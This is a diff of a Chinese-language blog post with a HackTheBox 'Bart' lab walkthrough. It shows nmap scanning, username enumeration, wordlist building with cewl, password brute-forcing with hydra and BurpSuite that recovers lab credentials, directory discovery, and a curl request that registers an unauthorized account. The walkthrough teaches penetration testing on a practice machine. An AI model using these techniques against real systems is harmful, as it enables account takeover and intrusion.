@@ -20,12 +20,12 @@
   <title>HTB: Bart - T0x1c</title>
 
   
-    <meta name="description" content="Bart是一个中等难度的靶机，知识点涉及密码爆破、网页信息爬取、javascript代码分析、登陆凭证获取、任意注册等。感兴趣的同学可以在HackTheBox中进行学习。">
+    <meta name="description" content="Bart是一个中等难度的靶机，知识点涉及密码爆破、网页信息爬取、JavaScript代码分析、登陆凭证获取、任意注册等。感兴趣的同学可以在HackTheBox中进行学习。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HTB: Bart">
 <meta property="og:url" content="https://toxic80l.github.io/post/d7f2b8e2/index.html">
 <meta property="og:site_name" content="T0x1c">
-<meta property="og:description" content="Bart是一个中等难度的靶机，知识点涉及密码爆破、网页信息爬取、javascript代码分析、登陆凭证获取、任意注册等。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:description" content="Bart是一个中等难度的靶机，知识点涉及密码爆破、网页信息爬取、JavaScript代码分析、登陆凭证获取、任意注册等。感兴趣的同学可以在HackTheBox中进行学习。">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://toxic80l.github.io/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%882.38.50.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0200.gif">
@@ -73,15 +73,26 @@
 <meta property="og:image" content="https://toxic80l.github.io/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%885.30.28.png">
 <meta property="og:image" content="https://toxic80l.github.io/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%886.26.52.png">
 <meta property="article:published_time" content="2022-02-07T01:46:43.000Z">
-<meta property="article:modified_time" content="2022-05-25T10:13:30.583Z">
+<meta property="article:modified_time" content="2022-07-13T19:40:40.918Z">
 <meta property="article:author" content="toxic80L">
-<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="nmap">
 <meta property="article:tag" content="文件上传">
-<meta property="article:tag" content="windows">
-<meta property="article:tag" content="javascript">
+<meta property="article:tag" content="JavaScript">
 <meta property="article:tag" content="域名解析">
-<meta property="article:tag" content="登陆凭证">
 <meta property="article:tag" content="密码爆破">
+<meta property="article:tag" content="任意注册">
+<meta property="article:tag" content="子域名">
+<meta property="article:tag" content="日志">
+<meta property="article:tag" content="用户凭据">
+<meta property="article:tag" content="gobuster">
+<meta property="article:tag" content="wfuzz">
+<meta property="article:tag" content="cewl">
+<meta property="article:tag" content="burpsuite">
+<meta property="article:tag" content="hydra">
+<meta property="article:tag" content="nishang">
+<meta property="article:tag" content="invoke-PowerShellTcp">
+<meta property="article:tag" content="PowerShell">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://toxic80l.github.io/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%882.38.50.png">
   
@@ -134,14 +145,14 @@
 
 <article class='content md post'>
 <h1 class="article-title"><span>HTB: Bart</span></h1>
-<p>Bart是一个中等难度的靶机，知识点涉及密码爆破、网页信息爬取、javascript代码分析、登陆凭证获取、任意注册等。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<p>Bart是一个中等难度的靶机，知识点涉及密码爆破、网页信息爬取、JavaScript代码分析、登陆凭证获取、任意注册等。感兴趣的同学可以在HackTheBox中进行学习。</p>
 <span id="more"></span>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%882.38.50.png" alt="截屏2021-10-21 上午2.38.50"></p>
 <span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0200.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span><u>通关思维导图</u>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/Bart.png" alt="Bart"></p>
 <h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先通过nmap对目标进行端口扫描</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.81 -oA nmap_Bart</span><br></pre></td></tr></table></figure>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%882.52.33.png" alt="截屏2021-10-21 上午2.52.33"><br>扫描结果显示目标开放了80端口</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%882.52.33.png" alt="截屏2021-10-21 上午2.52.33"><br>扫描结果显示目标只开放了80端口</p>
 <h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p>访问<code>http://10.10.10.81</code>会重定向至<code>http://forum.bart.htb</code>，因此需修改 hosts 文件通过用域名访问80端口</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"><span class="comment"># HTB配置</span></span><br><span class="line">10.10.10.81 forum.bart.htb bart.htb</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%883.15.06.png" alt="截屏2021-10-21 上午3.15.06"></p>
@@ -168,55 +179,55 @@
 </thead>
 <tbody><tr>
 <td>Samantha Brown</td>
-<td><a href="mailto:&#115;&#x2e;&#x62;&#x72;&#111;&#119;&#110;&#x40;&#x62;&#97;&#114;&#116;&#46;&#108;&#111;&#x63;&#x61;&#108;">&#115;&#x2e;&#x62;&#x72;&#111;&#119;&#110;&#x40;&#x62;&#97;&#114;&#116;&#46;&#108;&#111;&#x63;&#x61;&#108;</a></td>
+<td><a href="mailto:&#x73;&#x2e;&#98;&#x72;&#x6f;&#x77;&#x6e;&#64;&#98;&#97;&#x72;&#x74;&#x2e;&#x6c;&#111;&#99;&#97;&#x6c;">&#x73;&#x2e;&#98;&#x72;&#x6f;&#x77;&#x6e;&#64;&#98;&#97;&#x72;&#x74;&#x2e;&#x6c;&#111;&#99;&#97;&#x6c;</a></td>
 <td>CEO@BART</td>
 </tr>
 <tr>
 <td>Daniel Simmons</td>
-<td><a href="mailto:&#100;&#46;&#x73;&#105;&#x6d;&#109;&#x6f;&#x6e;&#x73;&#64;&#98;&#97;&#x72;&#x74;&#x2e;&#x68;&#116;&#x62;">&#100;&#46;&#x73;&#105;&#x6d;&#109;&#x6f;&#x6e;&#x73;&#64;&#98;&#97;&#x72;&#x74;&#x2e;&#x68;&#116;&#x62;</a></td>
+<td><a href="mailto:&#100;&#x2e;&#x73;&#x69;&#x6d;&#x6d;&#111;&#110;&#115;&#64;&#x62;&#x61;&#x72;&#116;&#x2e;&#x68;&#x74;&#98;">&#100;&#x2e;&#x73;&#x69;&#x6d;&#x6d;&#111;&#110;&#115;&#64;&#x62;&#x61;&#x72;&#116;&#x2e;&#x68;&#x74;&#98;</a></td>
 <td>Head of Sales</td>
 </tr>
 <tr>
 <td>Robert Hilton</td>
-<td><a href="mailto:&#x72;&#46;&#x68;&#105;&#108;&#116;&#111;&#x6e;&#x40;&#x62;&#97;&#x72;&#x74;&#46;&#x68;&#x74;&#98;">&#x72;&#46;&#x68;&#105;&#108;&#116;&#111;&#x6e;&#x40;&#x62;&#97;&#x72;&#x74;&#46;&#x68;&#x74;&#98;</a></td>
+<td><a href="mailto:&#114;&#46;&#104;&#105;&#x6c;&#x74;&#111;&#110;&#x40;&#x62;&#x61;&#x72;&#116;&#46;&#x68;&#116;&#98;">&#114;&#46;&#104;&#105;&#x6c;&#x74;&#111;&#110;&#x40;&#x62;&#x61;&#x72;&#116;&#46;&#x68;&#116;&#98;</a></td>
 <td>Head of IT</td>
 </tr>
 <tr>
 <td>Harvey Potter</td>
-<td><a href="mailto:&#104;&#x2e;&#x70;&#111;&#116;&#116;&#101;&#x72;&#x40;&#98;&#97;&#x72;&#x74;&#x2e;&#104;&#x74;&#98;">&#104;&#x2e;&#x70;&#111;&#116;&#116;&#101;&#x72;&#x40;&#98;&#97;&#x72;&#x74;&#x2e;&#104;&#x74;&#98;</a></td>
+<td><a href="mailto:&#104;&#x2e;&#x70;&#x6f;&#116;&#116;&#101;&#x72;&#64;&#98;&#x61;&#x72;&#116;&#46;&#104;&#x74;&#x62;">&#104;&#x2e;&#x70;&#x6f;&#116;&#116;&#101;&#x72;&#64;&#98;&#x61;&#x72;&#116;&#46;&#104;&#x74;&#x62;</a></td>
 <td>Developer@BART</td>
 </tr>
 <tr>
 <td>Daniella Lamborghini</td>
-<td><a href="mailto:&#x64;&#x2e;&#108;&#97;&#109;&#98;&#111;&#114;&#103;&#104;&#105;&#110;&#x69;&#x40;&#x62;&#97;&#x72;&#x74;&#x2e;&#x68;&#x74;&#98;">&#x64;&#x2e;&#108;&#97;&#109;&#98;&#111;&#114;&#103;&#104;&#105;&#110;&#x69;&#x40;&#x62;&#97;&#x72;&#x74;&#x2e;&#x68;&#x74;&#98;</a> (guess?)</td>
+<td><a href="mailto:&#x64;&#46;&#x6c;&#97;&#x6d;&#x62;&#111;&#x72;&#103;&#x68;&#105;&#x6e;&#105;&#x40;&#x62;&#97;&#114;&#116;&#x2e;&#104;&#x74;&#98;">&#x64;&#46;&#x6c;&#97;&#x6d;&#x62;&#111;&#x72;&#103;&#x68;&#105;&#x6e;&#105;&#x40;&#x62;&#97;&#114;&#116;&#x2e;&#104;&#x74;&#98;</a> (guess?)</td>
 <td>Head of Recruitment</td>
 </tr>
 </tbody></table>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%8810.13.02.png" alt="截屏2021-10-21 上午10.13.02"></p>
-<p>我们可以在监控登陆界面处的<code>找回密码</code>来进行用户名枚举。当输入错误的用户名时出现界面如下<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%8810.22.40.png" alt="截屏2021-10-21 上午10.22.40"></p>
+<p>利用监控登陆界面的<code>找回密码</code>功能进行用户名枚举。当输入错误的用户名时出现界面如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%8810.22.40.png" alt="截屏2021-10-21 上午10.22.40"></p>
 <p>当输入正确的用户名时，出现<code>email已发送</code>的提示信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%8810.23.15.png" alt="截屏2021-10-21 上午10.23.15"></p>
-<p>使用 cewl 从网页上爬取字符来获取对应的字典</p>
+<p>使用 cewl 从网页上爬取字符制作相对应的字典</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w cewl-forum.txt -e -a http://forum.bart.htb</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%8810.32.00.png" alt="截屏2021-10-21 上午10.32.00"></p>
-<p>使用 BurpSuite 对 harvey 用户进行密码爆破<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%882.25.34.png" alt="截屏2021-10-21 下午2.25.34"></p>
-<p>将密码参数<code>user_password</code>作为请求变量，成功爆破出密码为 potter<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%882.25.15.png" alt="截屏2021-10-21 下午2.25.15"></p>
-<p>使用<code>harvey/potter</code>进行登录监控界面<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%882.35.58.png" alt="截屏2021-10-21 下午2.35.58"></p>
-<p>登陆后发现存在另一个子域名：<code>internal-01.bart.htb</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%882.36.39.png" alt="截屏2021-10-21 下午2.36.39"></p>
+<p>使用 BurpSuite 的 Intruder 模块对 harvey 用户进行密码爆破<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%882.25.34.png" alt="截屏2021-10-21 下午2.25.34"></p>
+<p>以参数<code>user_password</code>作为请求变量，成功爆破出密码为 potter<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%882.25.15.png" alt="截屏2021-10-21 下午2.25.15"></p>
+<p>通过账号密码<code>harvey/potter</code>成功登录监控界面<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%882.35.58.png" alt="截屏2021-10-21 下午2.35.58"></p>
+<p>在<code>Servers</code>中发现另一个子域名：<code>internal-01.bart.htb</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%882.36.39.png" alt="截屏2021-10-21 下午2.36.39"></p>
 <h2 id="0x02-上线-iusr"><a href="#0x02-上线-iusr" class="headerlink" title="0x02 上线[iusr]"></a>0x02 上线[iusr]</h2><h3 id="密码爆破-1"><a href="#密码爆破-1" class="headerlink" title="密码爆破"></a>密码爆破</h3><p>修改 hosts 文件并添加新的子域名</p>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10.10</span><span class="number">.10</span><span class="number">.81</span> <span class="string">forum.bart.htb</span> <span class="string">bart.htb</span> <span class="string">monitor.bart.htb</span> <span class="string">internal-01.bart.htb</span></span><br></pre></td></tr></table></figure>
-<p>设置完成后访问<code>internal-01.bart.htb</code>，是一个内部聊天系统<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%882.38.57.png" alt="截屏2021-10-21 下午2.38.57"></p>
+<p>访问<code>internal-01.bart.htb</code>发现是内部聊天系统<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%882.38.57.png" alt="截屏2021-10-21 下午2.38.57"></p>
 <p>尝试使用之前的账号密码进行登录，显示报错信息：密码长度不得小于8位<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%882.41.10.png" alt="截屏2021-10-21 下午2.41.10"></p>
 <p>同时如果输入不存在的用户名则会提示用户名未认证<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%882.47.52.png" alt="截屏2021-10-21 下午2.47.52"></p>
 <p>尝试使用密码爆破的方式来获取密码，首先通过 BurpSuite 截取数据包<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%882.49.41.png" alt="截屏2021-10-21 下午2.49.41">使用 hydra 进行构造对请求数据包进行爆破，但是返回的 code 都是302，无法识别是否为正确的 code</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -t 1 -l harvey -P /usr/share/wordlists/fasttrack.txt  -o internal-out.txt -vV -f internal-01.bart.htb http-post-form <span class="string">&#x27;/simple_chat/login_form.php:uname=^USER^&amp;passwd=^PASS^&amp;submit=Login:error&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>我们还是使用 BurpSuite 进行爆破<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%883.58.55.png" alt="截屏2021-10-21 下午3.58.55"></p>
-<p>成功拿到密码为<code>Password1</code>，使用<code>harvey/Password1</code>登录系统<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%883.01.29.png" alt="截屏2021-10-21 下午3.01.29"></p>
+<p>切换 BurpSuite 进行爆破，成功拿到密码为<code>Password1</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%883.58.55.png" alt="截屏2021-10-21 下午3.58.55"></p>
+<p>使用<code>harvey/Password1</code>登录系统<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%883.01.29.png" alt="截屏2021-10-21 下午3.01.29"></p>
 <h3 id="任意注册"><a href="#任意注册" class="headerlink" title="任意注册"></a>任意注册</h3><p>除了爆破以外我们还可以通过另外一种方式进行登录，扫描 simple_chat 目录可发现存在注册页面<code>register.php</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://internal-01.bart.htb/simple_chat -w /usr/share/wordlists/dirb/big.txt -x html,php,txt</span><br></pre></td></tr></table></figure>
 <p>虽然无法直接访问该文件。但是我们可通过以下命令注册一个新用户</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d <span class="string">&quot;uname=mac&amp;passwd=password&quot;</span></span><br></pre></td></tr></table></figure>
 <p>以<code>mac/password</code>同样能够成功登录系统<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%883.40.42.png" alt="截屏2021-10-21 下午3.40.42"></p>
-<h3 id="js代码分析"><a href="#js代码分析" class="headerlink" title="js代码分析"></a>js代码分析</h3><p>查看页面源代码发现其中存在 javascript 代码</p>
